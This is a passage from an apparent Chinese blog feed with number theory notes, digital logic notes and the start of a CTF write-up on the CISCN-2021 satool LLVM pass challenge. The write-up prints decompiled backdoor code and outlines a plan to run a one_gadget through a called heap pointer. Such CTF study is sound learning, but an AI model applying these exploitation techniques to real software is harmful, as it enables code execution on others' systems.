p-1$，因为(a,p)&#x3D;1，因此a存在逆元a’，由$ax\equiv 1(\mod m)$的解数为1，故满足$1\le a’\le p-1$的逆元也是唯一的。在1,2,…,p-1中将这些数一一配对，每一对的两数均互为逆元，则结论显然成立。</p><hr><p><font color=purple>定理2.15</font> （中国剩余定理）设$m_1,m_2,…,m_S$为两两互素的正整数，$b_1,b_2,…,b_S$为任意整数，则同余式组<br>$$<br>\left{<br>        \begin{array}{rcl}<br>             x\equiv b_1(\mod m_1)\<br>             x\equiv b_2(\mod m_2)\<br>             …\<br>             x\equiv b_S(\mod m_S)<br>       \end{array}<br>\right.<br>$$<br>模$M&#x3D;m_1…m_S$有唯一解$x\equiv \sum_{i&#x3D;1}^S b_i\frac{M}{m_i}(\frac{M}{m_i})^{-1}(\mod m_i)(\mod M)$</p><p><font color=dblue>证明：</font><br>存在性：代入上式即可<br>唯一性：设有一个解为x<del>0</del>，则其满足上面任意一个式子，根据定理1.14有$M&#x3D;[m_1,m_2,…,m_S]|x-x_0$，即$x\equiv x_0(\mod M)$，解唯一。</p><hr><p><font color=purple>定理2.16</font> 设$m_1,m_2,…,m_S$为两两互素的正整数，对于$1\le i\le s$，同余式$f_i(x)\equiv 0(\mod m_i)$有C<del>i</del>个解，则同余式组<br>$$<br>\left{<br>        \begin{array}{rcl}<br>             f(x)\equiv 0(\mod m_1)\<br>             f(x)\equiv 0(\mod m_2)\<br>             …\<br>             f(x)\equiv 0(\mod m_S)<br>       \end{array}<br>\right.<br>$$<br>关于模$M&#x3D;m_1…m_S$有$C_1C_2…C_s$个解。</p><p><font color=dblue>证明：</font>组合。<br>证明这些解互不同余：<br>若有$x\equiv x’(\mod M)$，则由定理2.2可知对于任意i均有$x\equiv x’(\mod m_i)$，故x&#x3D;x’。<br>任何b<del>i</del>变化都会导致解不同。</p><hr><p><font color=purple>定理2.17</font> p为素数，$i_1\ge i_2\ge … i_S,b_1,b_2,…,b_S$为任意整数，同余式组<br>$$<br>\left{<br>        \begin{array}{rcl}<br>             x\equiv b_1(\mod p^{i_1})\<br>             x\equiv b_2(\mod p^{i_2})\<br>             …\<br>             x\equiv b_S(\mod p^{i_S})<br>       \end{array}<br>\right.<br>$$<br>有解的充要条件为<br>$$<br>\left{<br>        \begin{array}{rcl}<br>             b_1\equiv b_2(\mod p^{i_2})\<br>             b_1\equiv b_3(\mod p^{i_3})\<br>             …\<br>             b_1\equiv b_S(\mod p^{i_S})<br>       \end{array}<br>\right.<br>$$</p><p><font color=dblue>证明：</font><br>充分性易证<br>必要性：若有解x<del>0</del>，则由定理2.2可知$x_0\equiv b_1(\mod p^{i_2})$，故$b_1$是第二个式子的解，同理b<del>1</del>也是后面所有式子的解。</p><hr><p><font color=blue>定义2.6</font> 导式</p><hr><p><font color=purple>定理2.18</font> 设p为素数，$k\ge 1$，若$x\equiv x_k(\mod p^k)$为同余式$f(x)\equiv 0(\mod p^k)$的一个解，则在这个剩余类中：<br>(1) 若$(p,f’(x^k))&#x3D;1$，则同余式$f(x)\equiv 0(\mod p^{k+1})$有唯一解。<br>(2) 若$p|f’(x^k)$，当$f(x_k)\ne 0(\mod p^{k+1})$时，同余式$f(x)\equiv 0(\mod p^{k+1})$无解，否则有p个解。</p><p><font color=dblue>证明：</font><br>由定理2.2可知，同余式$f(x)\equiv 0(\mod p^{k+1})$的解一定是$f(x)\equiv 0(\mod p^k)$的解，因此我们只需对$f(x)\equiv 0(\mod p^k)$的解进行筛选即可。</p><p>从$x&#x3D;x_k+p^kt,t\in\mathbb Z$中进行筛选：<br>将其代入到$f(x)\equiv 0(\mod p^{k+1})$中使用泰勒公式可得：<br>$$f(x_k)+f’(x_k)p^kt+\sum_{i&#x3D;2}^n\frac{f^{(i)}(x_k)p^{ik}}{i!}t^i\equiv 0(\mod p^{k+1})$$<br>因为$\frac{f^{(i)}(x_k)}{i!}&#x3D;\frac{a_n\cdot n!}{i!(n-i)!}$为整数，因此有$i!|f^{(i)}(x_k)$。即泰勒展开除前面两项之外后面所有项均整除$p^{k+1}$，可以全部消去，化简为：<br>$$f(x_k)+f’(x_k)p^kt\equiv 0(\mod p^{k+1})$$<br>又$p^k|f(x_k)$，上式可以化为：<br>$$\frac{f(x_k)}{p^k}+f’(x_k)t\equiv 0(\mod p^{k+1})$$<br>若$(f’(x_k),p)&#x3D;1$则t仅有1个取值。若为0则与定理结论相符。</p><p><font color=orange>推论</font> p为素数，若$x\equiv x_1(\mod p)$是同余式$f(x)\equiv 0(\mod p)$的一个解，且满足$(f’(x_1),p)&#x3D;1$，则对于任意正整数k&gt;1，$f(x)\equiv 0(\mod p^k)$的满足$x\equiv x_1(\mod p)$的解x<del>k</del>可以通过以下递推式得到：<br>$$x_i&#x3D;x_{i-1}-f(x_{i-1})((f’(x_1))^{-1}(\mod p))(\mod p^i),i&#x3D;1,2,3,…,k$$</p><p><font color=dblue>证明：</font>数学归纳法</p><hr>]]></content>
      
      
      
    </entry>
    
    
    
    <entry>
      <title>数字逻辑 Chapter 5——同步时序逻辑电路</title>
      <link href="/2023/02/28/%E6%95%B0%E5%AD%97%E9%80%BB%E8%BE%91-Chapter-5%E2%80%94%E2%80%94%E5%90%8C%E6%AD%A5%E6%97%B6%E5%BA%8F%E9%80%BB%E8%BE%91%E7%94%B5%E8%B7%AF/"/>
      <url>/2023/02/28/%E6%95%B0%E5%AD%97%E9%80%BB%E8%BE%91-Chapter-5%E2%80%94%E2%80%94%E5%90%8C%E6%AD%A5%E6%97%B6%E5%BA%8F%E9%80%BB%E8%BE%91%E7%94%B5%E8%B7%AF/</url>
      
        <content type="html"><![CDATA[<h1 id="5-1-时序逻辑电路概述"><a href="#5-1-时序逻辑电路概述" class="headerlink" title="5.1 时序逻辑电路概述"></a>5.1 时序逻辑电路概述</h1><h2 id="5-1-1-时序逻辑电路描述方法"><a href="#5-1-1-时序逻辑电路描述方法" class="headerlink" title="5.1.1 时序逻辑电路描述方法"></a>5.1.1 时序逻辑电路描述方法</h2><p>若逻辑电路在任何时刻产生的稳定输出信号不仅与电路在该时刻的输入信号有关，还与电路过去的输入信号有关，则称为时序逻辑电路。</p><p>根据电路中是否有统一定时信号分为两类：同步时序逻辑电路和异步时序逻辑电路。</p><p>一、逻辑函数表达式<br>同步时序逻辑电路的结构与功能，可以用三组逻辑函数表达式描述。</p><ol><li>输出函数表达式：一组反映电路输出Z与输入x和状态y之间关系的表达式。<br>Mealy型电路：电路输出与输入和状态均有关<br>Moore型电路：电路输出仅与状态有关</li><li>激励函数表达式：控制函数，反映存储电路的输入Y与外部输入x和电路状态y之间的关系<br>$Y_j&#x3D;g_j(x_1,x_2,…,x_n,y_1,y_2,…,y_s),j&#x3D;1,2,…,r$</li><li>次态函数表达式：次态函数用于反映同步时序电路的次态与激励函数$Y$和现态y的关系，与触发器类型相关。$y_l^{n+1}&#x3D;k_l(Y_j,y_j),j&#x3D;1,2,…,r;l&#x3D;1,2,…,s$</li></ol><p>二、状态表<br>反映同步时序电路输出Z、次态$y^{n+1}$与电路输入x、现态y之间的关系的表格，又称状态转移表。Moore型电路的状态表中次态与输出分栏列出，Mealy型电路的状态表中次态与输出在一栏列出。两种电路的状态表中第一栏均为现态，第二栏为次态或次态&#x2F;输出，其下分多栏对应不同x输入时的y或y&#x2F;Z。<br>状态表清晰地给出了同步时序电路在不同输入和现态下的次态和输出。</p><p>三、状态图<br>一种反映同步时序电路状态转换规律及相应输入、输出取值关系的有向图。<br>每一个结点均代表一个存储电路状态，对于Moore型电路，其输出写在结点中，代表该结点的存储电路状态产生的输出；对于Mealy型电路，其输出写在箭头上，代表该箭头的发出端的存储电路状态与箭头上的输入共同决定的输出的值。</p><p>四、时间图<br>使用波形图的方式表示输入信号、输出信号与电路状态的取值在各时刻的对应关系，通常称为工作波形图。可以表示电路状态的转换时刻。</p><h1 id="5-2-同步时序逻辑电路分析"><a href="#5-2-同步时序逻辑电路分析" class="headerlink" title="5.2 同步时序逻辑电路分析"></a>5.2 同步时序逻辑电路分析</h1><h2 id="5-2-1-分析方法与步骤"><a href="#5-2-1-分析方法与步骤" class="headerlink" title="5.2.1 分析方法与步骤"></a>5.2.1 分析方法与步骤</h2><p>表格法与代数法。<br>一、表格分析法一般步骤：</p><ul><li>写出输出函数与激励函数表达式</li><li>借助触发器功能表列出电路次态真值表</li><li>画出状态表和状态图（如有必要需画出时间图）</li><li>归纳电路逻辑功能</li></ul><p>二、代数分析法一般步骤：</p><ul><li>写出输出函数表达式和激励函数表达式</li><li>将激励函数表达式代入触发器的次态方程，导出电路的次态方程组</li><li>画出状态表和状态图</li><li>归纳电路逻辑功能</li></ul><p><font color=red><strong>重要：各种触发器输出关于输入和状态的函数（仅列出钟控触发器）</strong><br>R-S触发器：$Q^{n+1}&#x3D;S+\bar RQ$<br>D触发器：$Q^{n+1}&#x3D;D$<br>J-K触发器：$Q^{n+1}&#x3D;J\bar Q+\bar KQ$<br>T触发器：$Q^{n+1}&#x3D;T\bar Q+\bar TQ$<br></font></p><h1 id="5-3-同步时序逻辑电路设计"><a href="#5-3-同步时序逻辑电路设计" class="headerlink" title="5.3 同步时序逻辑电路设计"></a>5.3 同步时序逻辑电路设计</h1><p>设计一般步骤：</p><ol><li>根据功能需求形成原始状态图和原始状态表</li><li>状态化简，求出最小化状态表</li><li>状态编码，得到二进制状态表</li><li>选择触发器的类型，求出激励函数与输出函数最简表达式</li><li>画出逻辑电路图</li></ol><h2 id="5-3-1-建立原始状态图和原始状态表"><a href="#5-3-1-建立原始状态图和原始状态表" class="headerlink" title="5.3.1 建立原始状态图和原始状态表"></a>5.3.1 建立原始状态图和原始状态表</h2><ol><li>确定电路类型：Moore型、Mealy型，大多数需求这两种都可以实现，但复杂程度可能不同</li><li>设定初始状态：时序逻辑电路在输入信号开始作用前的状态</li><li>根据需要记忆的信息添加新的状态：状态数量多少取决于需要记忆和区分的信息量</li><li>确定各时刻电路的输出：Moore型电路指出每个状态对应输出，Mealy型电路指出每个状态和输入的组合对应输出。</li></ol><h2 id="5-3-2-状态化简"><a href="#5-3-2-状态化简" class="headerlink" title="5.3.2 状态化简"></a>5.3.2 状态化简</h2><ol><li><p>状态等效<br> (1) 等效状态：对于所有可能的输入序列，分别从两个状态出发得到的输出序列完全相同，称两个状态等效。判断方法：输出相同且次态满足三种情况之一：次态相同、次态交错或互为现态、次态循环或为等效对。<strong>等效具有传递性</strong>。<br> (2) 等效类：若干彼此等效的状态组成的集合，其中任意两个状态均等效。<br> (3) 最大等效类：不是其他任何一个等效类的真子集的等效类</p></li><li><p>状态化简<br> 隐含表法。步骤：<br> (1) 作出隐含表<br> (2) 找出等效对<br> (3) 求出最大等效类<br> (4) 状态合并<br> (5) 作出最简状态表</p><p> 隐含表：</p></li></ol><p><img src="https://img-blog.csdnimg.cn/f20121e65e4341b88c640e01ba0caad2.png?x-oss-process=image/watermark,type_d3F5LXplbmhlaQ,shadow_50,text_Q1NETiBATDNIX0NvTGlu,size_11,color_FFFFFF,t_70,g_se,x_16"></p><h2 id="5-3-3-状态编码"><a href="#5-3-3-状态编码" class="headerlink" title="5.3.3 状态编码"></a>5.3.3 状态编码</h2><p>最小化状态表中用字母或数字表示的状态，指定一个二进制代码，形成二进制状态表。方法：相邻分配法。<br>以下情况分配相邻状态码，优先级依次降低：</p><ol><li>次态相同，为现态分配相邻状态码</li><li>同一现态，为次态分配相邻状态码</li><li>输出相同，为现态分配相邻状态码</li></ol><h2 id="5-3-4-确定激励函数和输出函数并画出逻辑电路图"><a href="#5-3-4-确定激励函数和输出函数并画出逻辑电路图" class="headerlink" title="5.3.4 确定激励函数和输出函数并画出逻辑电路图"></a>5.3.4 确定激励函数和输出函数并画出逻辑电路图</h2><p>列出激励函数与输出函数真值表<br>使用卡诺图化简后写出最简表达式<br><img src="https://img-blog.csdnimg.cn/0cc9b5cbfa284f3e9004d14c0136608e.png?x-oss-process=image/watermark,type_d3F5LXplbmhlaQ,shadow_50,text_Q1NETiBATDNIX0NvTGlu,size_20,color_FFFFFF,t_70,g_se,x_16"><br><img src="https://img-blog.csdnimg.cn/67927cc7251c46369e3781ca3513cab2.png?x-oss-process=image/watermark,type_d3F5LXplbmhlaQ,shadow_50,text_Q1NETiBATDNIX0NvTGlu,size_20,color_FFFFFF,t_70,g_se,x_16"></p><h2 id="5-3-5-注意的问题"><a href="#5-3-5-注意的问题" class="headerlink" title="5.3.5 注意的问题"></a>5.3.5 注意的问题</h2><ol><li>电路是否能够自恢复。设计电路的最佳状态时电路正常状态下不会到达无效状态，其次是万一进入无效状态后能够在输入信号和脉冲作用下自动进入有效状态，后者称为“自恢复”，否则称为“挂起”。电路中包含多个无效状态时往往将无效状态构成的集合称为状态的无效序列，正常的状态称为有效序列。</li><li>电路是否会产生错误输出。处于无效状态时，是否会在输入信号和时钟脉冲作用下产生错误输出信号。<br>若存在“挂起”和错误输出，则需要进行设计修正。</li></ol>]]></content>
      
      
      
    </entry>
    
    
    
    <entry>
      <title>LLVM pass pwn 入门 (2)</title>
      <link href="/2023/02/28/LLVM-pass-pwn-%E5%85%A5%E9%97%A8-2/"/>
      <url>/2023/02/28/LLVM-pass-pwn-%E5%85%A5%E9%97%A8-2/</url>
      
        <content type="html"><![CDATA[<p>本文来分析几道题目，熟悉下LLVM pass pwn的解题流程。</p><h1 id="CISCN-2021-satool"><a href="#CISCN-2021-satool" class="headerlink" title="CISCN-2021 satool"></a>CISCN-2021 satool</h1><p>国赛题，2022年也出了一道名字都一样的题，可见国赛还是很重视这类题型的。</p><p>这一题的附件很难找，笔者将其放在了自己的<a href="https://github.com/Hornos3/pwnfile">github</a>中，便于读者复现。</p><p>首先当然是使用IDA打开。发现符号表被抠了，不过我们还是有定位runOnFunction的方法。<br>需要注意的是，题目中给的runOnFunction函数是覆写的llvm库中的runOnFunction方法，因此其一定会被vtable表引用，而vtable表在.rodata段中，只需要调到IDA-view界面查看名字未知的函数中哪一个有足够的长度，而且被.rodata段引用即可。</p><p><img src="https://img-blog.csdnimg.cn/fbe4f230b86545c09af6e4fd729758d9.png"><br>发现红框中的两个函数都有足够的长度，但是只有sub_19D0被.rodata段引用，因此判定这就是覆写的runOnFunction方法了。</p><p>由于我们有llvm的所有头文件源码，因此对于.so文件中llvm方法的调用，我们都可以找到相应的声明，有助于我们理解代码本身。</p><h2 id="1-逆向分析"><a href="#1-逆向分析" class="headerlink" title="1. 逆向分析"></a>1. 逆向分析</h2><p><img src="https://img-blog.csdnimg.cn/2379427a6221472f940b117bdd412d0a.png"><br>首先进行的是两个条件判断，这里判断rdx是否为8，函数的返回值是否等于该字符串的值。经过调试发现，上面的函数<code>getName()</code>的返回值是<code>llvm::value</code>对象的名字。需要注意的是，<code>llvm::value</code>是llvm中最重要的一个类，其可以代表一个常量、变量、指令或函数。这里可以看到如果对象的名字不是<code>B4ckDo0r</code>，则会直接退出不作处理。要想进行下面的处理，我们就必须要让一个函数的名字为<code>B4ckDo0r</code>。至于前面对rdx的判断，这应该也算是<code>getName()</code>函数的返回值，其表示的是对象名字的长度。显而易见，<code>B4ckDo0r</code>的长度为8，因此这里判断长度是否为8合情合理。</p><p>注：这里说明一下llvm pass类题目如何调试。</p><p>我们需要通过opt程序加载.so链接库，同时输入.ll文件以生成IR输出，因此应该调试opt这个程序（带参数的opt调试方式：<code>gdb opt</code>、<code>r 参数, 参数,...</code>），我们可以先对opt下一个在main开头的断点，保证其在一开始执行就能够中断，注意此时.so链接库并未被加载到内存中，本题的opt程序中在main函数有一堆函数调用，快速步过后经过某一条call指令可以发现.so库被加载，此时再下链接库的断点，继续执行就可以让程序断在我们想要调试的runOnFunction()函数了。这种方式是笔者自己探索出来的，比较麻烦，但由于这方面的资料实在太少，找不到现成的参考，只能先这样做了。如有更加简便的方法还请读者不吝赐教。</p><p>前面我们知道了只有名为<code>B4ckDo0r</code>的函数才能被优化，后面的代码错综复杂，手动地去一步步分析显然是不太现实的，我们重点关注一下程序中提到的字符串，看能不能找到一些流程控制的线索。</p><p><code>(line 175) if ( !(unsigned int)str_compare(&amp;p_dest, &quot;save&quot;) )</code><br><code>(line 300) if ( (unsigned int)str_compare(&amp;p_dest, &quot;takeaway&quot;) )</code><br><code>(line 444) if ( !(unsigned int)str_compare(&amp;p_dest, &quot;stealkey&quot;) )</code><br><code>(line 469) if ( !(unsigned int)str_compare(&amp;p_dest, &quot;fakekey&quot;) )</code><br><code>(line 517) if ( !(unsigned int)str_compare(&amp;p_dest, &quot;fakekey&quot;) )</code></p><p>我们很容易能够找到上面的几行语句，这里的save、takeaway等字符串显然是突破的关键所在。</p><p>经过调试发现，这里的<code>&amp;p_dest</code>指的是函数中操作符的名字，如第一条语句调用printf函数时，操作符名即为printf。因此我们不仅要保证其函数名为<code>B4ckDo0r</code>，还要保证其中调用的函数名为上面五个字符串中的一个。</p><p>在save控制流程中，我们发现了这些代码，通过字符串可以猜测出这应该是报错信息，对于使用C语言程序正常生成的.ll文件，应该不会有这样的问题出现。因此在下面凡是看到跳转到这些label的代码，就统统都可以不看了，能够节省很多时间。</p><p><img src="https://img-blog.csdnimg.cn/2f19852f33d84a3295cde2ed1ece8b57.png"><br>剔除掉这些检查的代码之后，我们发现真正对我们有用的代码实际上也就这么几行。</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// save</span></span><br><span class="line">            v31 = n;</span><br><span class="line">            v32 = <span class="built_in">malloc</span>(<span class="number">0x18</span>uLL);</span><br><span class="line">            v32[<span class="number">2</span>] = byte_2040f8;</span><br><span class="line">            byte_2040f8 = v32;</span><br><span class="line">            v33 = (<span class="type">char</span> *)src;</span><br><span class="line">            <span class="built_in">memcpy</span>(v32, src, v31);</span><br><span class="line">            v34 = v32 + <span class="number">1</span>;</span><br><span class="line">            v35 = (<span class="type">char</span> *)v84[<span class="number">0</span>];</span><br><span class="line">            <span class="built_in">memcpy</span>(v34, v84[<span class="number">0</span>], (<span class="type">size_t</span>)v84[<span class="number">1</span>]);</span><br><span class="line">            <span class="keyword">if</span> ( v35 != &amp;v85 )</span><br><span class="line">            &#123;</span><br><span class="line">              <span class="function"><span class="keyword">operator</span> <span class="title">delete</span><span class="params">(v35)</span></span>;</span><br><span class="line">              v33 = (<span class="type">char</span> *)src;</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="keyword">if</span> ( v33 != v88 )</span><br><span class="line">              <span class="function"><span class="keyword">operator</span> <span class="title">delete</span><span class="params">(v33)</span></span>;</span><br><span class="line"><span class="comment">// stealkey</span></span><br><span class="line">          v66 = llvm::CallBase::<span class="built_in">getNumTotalBundleOperands</span>((llvm::CallBase *)(v6 - <span class="number">24</span>));</span><br><span class="line">          <span class="keyword">if</span> ( byte_2040f8</span><br><span class="line">            &amp;&amp; !(<span class="number">-1431655765</span></span><br><span class="line">               * (<span class="type">unsigned</span> <span class="type">int</span>)((v15</span><br><span class="line">                               + <span class="number">24</span> * v65</span><br><span class="line">                               - <span class="number">24LL</span> * v66</span><br><span class="line">                               - (v8</span><br><span class="line">                                - <span class="number">24</span> * (<span class="type">unsigned</span> __int64)(*(_DWORD *)(v8 + <span class="number">20</span>) &amp; <span class="number">0xFFFFFFF</span>))) &gt;&gt; <span class="number">3</span>)) )</span><br><span class="line">          &#123;</span><br><span class="line">            byte_204100 = *byte_2040f8;</span><br><span class="line">          &#125;</span><br><span class="line"><span class="comment">// fakekey</span></span><br><span class="line">              v76 = byte_204100;</span><br><span class="line">              <span class="keyword">if</span> ( *(_BYTE *)(*(_QWORD *)v75 + <span class="number">16LL</span>) == <span class="number">13</span> )</span><br><span class="line">                SExtValue = llvm::APInt::<span class="built_in">getSExtValue</span>((llvm::APInt *)(*(_QWORD *)v75 + <span class="number">24LL</span>));</span><br><span class="line">              <span class="keyword">else</span></span><br><span class="line">                SExtValue = <span class="number">0LL</span>;</span><br><span class="line">              byte_204100 = v76 + SExtValue;</span><br><span class="line">              *byte_2040f8 = v76 + SExtValue;</span><br><span class="line"><span class="comment">// run</span></span><br><span class="line">          <span class="keyword">if</span> ( !(<span class="number">-1431655765</span></span><br><span class="line">               * (<span class="type">unsigned</span> <span class="type">int</span>)((v15</span><br><span class="line">                               + <span class="number">24</span> * v80</span><br><span class="line">                               - <span class="number">24LL</span></span><br><span class="line">                               * (<span class="type">unsigned</span> <span class="type">int</span>)llvm::CallBase::<span class="built_in">getNumTotalBundleOperands</span>((llvm::CallBase *)(v6 - <span class="number">24</span>))</span><br><span class="line">                               - (v8</span><br><span class="line">                                - <span class="number">24</span> * (<span class="type">unsigned</span> __int64)(*(_DWORD *)(v8 + <span class="number">20</span>) &amp; <span class="number">0xFFFFFFF</span>))) &gt;&gt; <span class="number">3</span>)) )</span><br><span class="line">            ((<span class="built_in">void</span> (__fastcall *)(_QWORD, _QWORD, _QWORD, _QWORD, _QWORD, _QWORD, _QWORD, _QWORD, _QWORD, _QWORD, _QWORD, _QWORD, _QWORD, _QWORD, _QWORD, _QWORD, _QWORD, _QWORD, _QWORD, _QWORD))*byte_2040f8)(</span><br><span class="line">              <span class="number">0LL</span>,</span><br><span class="line">              <span class="number">0LL</span>,</span><br><span class="line">              <span class="number">0LL</span>,</span><br><span class="line">              <span class="number">0LL</span>,</span><br><span class="line">              <span class="number">0LL</span>,</span><br><span class="line">              <span class="number">0LL</span>,</span><br><span class="line">              <span class="number">0LL</span>,</span><br><span class="line">              <span class="number">0LL</span>,</span><br><span class="line">              <span class="number">0LL</span>,</span><br><span class="line">              <span class="number">0LL</span>,</span><br><span class="line">              <span class="number">0LL</span>,</span><br><span class="line">              <span class="number">0LL</span>,</span><br><span class="line">              <span class="number">0LL</span>,</span><br><span class="line">              <span class="number">0LL</span>,</span><br><span class="line">              <span class="number">0LL</span>,</span><br><span class="line">              <span class="number">0LL</span>,</span><br><span class="line">              <span class="number">0LL</span>,</span><br><span class="line">              <span class="number">0LL</span>,</span><br><span class="line">              <span class="number">0LL</span>,</span><br><span class="line">              <span class="number">0LL</span>);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">if</span> ( p_dest != &amp;dest )</span><br><span class="line">          <span class="function"><span class="keyword">operator</span> <span class="title">delete</span><span class="params">(p_dest)</span></span>;</span><br><span class="line">        v7 = v83;</span><br></pre></td></tr></table></figure><p>注意save中的malloc函数，它分配了一个0x20大小的chunk到bss段中，随后进行了两次memcpy内存拷贝向里面写入了某些值，具体操作如何我们下面调试的时候再行分析。在takeaway中有一大堆的条件，但最终只有一个free，猜测是满足某些条件后会释放save中分配的chunk。在stealkey中将chunk地址保存到了另外一个位置，且这个位置就在保存chunk地址的位置的上面。在fakekey中将保存chunk地址的地方写入了某个值。在run中将保存chunk的地址作为一个函数指针执行。可见如果能够在保存chunk的地方写入one_gadget，就能够打通这道题了。</p><p>下面开始调试。</p><h2 id="2-调试与解题"><a href="#2-调试与解题" class="headerlink" title="2. 调试与解题"></a>2. 调试与解题</h2><p>第一次测试代码：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="type">void</span> <span class="title function_">save</span><span class="params">()</span>&#123;<span class="built_in">printf</span>(<span class="string">&quot;123456&quot;</span>);&#125;</span><br><span class="line"><span class="type">void</span> <span class="title function_">takeaway</span><span class="params">()</span>&#123;<span class="built_in">printf</span>(<span class="string">&quot;654321&quot;</span>);&#125;</span><br><span class="line"><span class="type">void</span> <span class="title function_">stealkey</span><span class="params">()</span>&#123;<span class="built_in">printf</span>(<span class="string">&quot;abcdef&quot;</span>);&#125;</span><br><span class="line"><span class="type">void</span> <span class="title function_">fakekey</span><span class="params">()</span>&#123;<span class="built_in">printf</span>(<span class="string">&quot;fedcba&quot;</span>);&#125;</span><br><span class="line"><span class="type">void</span> <span class="title function_">run</span><span class="params">()</span>&#123;<span class="built_in">printf</span>(<span class="string">&quot;888888&quot;</span>);&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">int</span> <span class="title function_">B4ckDo0r</span><span class="params">()</span>&#123;</span><br><span class="line">save();</span><br><span class="line">takeaway();</span><br><span class="line">stealkey();</span><br><span class="line">fakekey();</span><br><span class="line">run();</span><br><span class="line"><span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br></pre></td><td class="code"><pre><span class="line">; ModuleID = &#x27;test.c&#x27;</span><br><span class="line">source_filename = &quot;test.c&quot;</span><br><span class="line">target datalayout = &quot;e-m:e-p270:32:32-p271:32:32-p272:64:64-i64:64-f80:128-n8:16:32:64-S128&quot;</span><br><span class="line">target triple = &quot;x86_64-pc-linux-gnu&quot;</span><br><span class="line"></span><br><span class="line">@.str = private unnamed_addr constant [7 x i8] c&quot;123456\00&quot;, align 1</span><br><span class="line">@.str.1 = private unnamed_addr constant [7 x i8] c&quot;654321\00&quot;, align 1</span><br><span class="line">@.str.2 = private unnamed_addr constant [7 x i8] c&quot;abcdef\00&quot;, align 1</span><br><span class="line">@.str.3 = private unnamed_addr constant [7 x i8] c&quot;fedcba\00&quot;, align 1</span><br><span class="line">@.str.4 = private unnamed_addr constant [7 x i8] c&quot;888888\00&quot;, align 1</span><br><span class="line"></span><br><span class="line">; Function Attrs: noinline nounwind optnone uwtable</span><br><span class="line">define dso_local void @save() #0 &#123;</span><br><span class="line">  %1 = call i32 (i8*, ...) @printf(i8* getelementptr inbounds ([7 x i8], [7 x i8]* @.str, i64 0, i64 0))</span><br><span class="line">  ret void</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">declare dso_local i32 @printf(i8*, ...) #1</span><br><span class="line"></span><br><span class="line">; Function Attrs: noinline nounwind optnone uwtable</span><br><span class="line">define dso_local void @takeaway() #0 &#123;</span><br><span class="line">  %1 = call i32 (i8*, ...) @printf(i8* getelementptr inbounds ([7 x i8], [7 x i8]* @.str.1, i64 0, i64 0))</span><br><span class="line">  ret void</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">; Function Attrs: noinline nounwind optnone uwtable</span><br><span class="line">define dso_local void @stealkey() #0 &#123;</span><br><span class="line">  %1 = call i32 (i8*, ...) @printf(i8* getelementptr inbounds ([7 x i8], [7 x i8]* @.str.2, i64 0, i64 0))</span><br><span class="line">  ret void</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">; Function Attrs: noinline 